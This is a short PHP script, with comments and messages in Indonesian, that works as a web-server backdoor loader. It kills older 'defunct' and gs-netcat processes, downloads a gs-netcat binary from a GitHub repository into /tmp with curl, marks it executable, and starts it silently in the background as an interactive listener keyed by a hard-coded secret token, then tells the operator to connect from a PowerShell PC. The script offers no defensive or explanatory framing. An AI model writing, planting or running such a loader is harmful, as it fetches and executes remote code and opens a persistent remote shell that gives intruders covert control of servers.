<?php
$token = "u401823943dTQwMTgyMzk0Mw";
$tmp_path = "/tmp/gs-netcat";

echo "--- Memulai Proses Recovery ---<br>";

// 1. Bersihkan proses lama
system("pkill -f defunct");
system("pkill -f gs-netcat");

// 2. Download binary fresh ke /tmp
if (!file_exists($tmp_path)) {
    echo "Mendownload binary ke /tmp...<br>";
    system("curl -fsSL https://github.com/hackerschoice/binary/raw/main/gsocket/gs-netcat_x86_64-alpine -o $tmp_path");
    system("chmod +x $tmp_path");
}

// 3. Verifikasi file
if (file_exists($tmp_path)) {
    echo "Binary siap. Memulai Listener...<br>";
    // Jalankan di background
    exec("HOME=/tmp $tmp_path -s $token -l -i > /dev/null 2>&1 &");
    echo "GSocket AKTIF! Silakan konek dari PowerShell PC.";
} else {
    echo "Gagal download ke /tmp. Coba cek koneksi internet server.";
}
?>
